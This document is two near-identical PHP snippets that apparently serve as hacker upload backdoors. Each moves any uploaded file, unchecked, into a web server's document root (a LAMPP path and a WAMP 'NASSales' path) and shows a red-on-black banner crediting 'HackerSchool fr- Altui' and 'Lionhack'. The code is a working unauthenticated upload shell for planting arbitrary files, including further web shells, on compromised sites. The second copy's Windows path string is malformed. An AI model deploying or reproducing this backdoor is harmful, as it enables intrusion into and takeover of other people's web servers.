<?php $uploaddir = '/opt/lampp/htdocs/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if
 
(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div
 
align=center><font size=5 color=#ff0000>HackerSchool fr- Altui | uploaded successfully</font></body>'; } else { print '<body
 
bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000>HackerSchool fr- Altui| Error !
</font> <marquee> Lionhack </marquee> </body>'; } ?> <?php $uploaddir = 'C:\wamp\www\NASSales\'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if
 
(move_uploaded_file($_FILES['userfile']['tmp_name'],$uploadfile)) { print '<body bgcolor=#000></br></br><div
 
align=center><font size=5 color=#ff0000>HackerSchool fr- Altui | uploaded successfully</font></body>'; } else { print '<body
 
bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000>HackerSchool fr- Altui| Error !
</font> <marquee> Lionhack </marquee> </body>'; } ?> 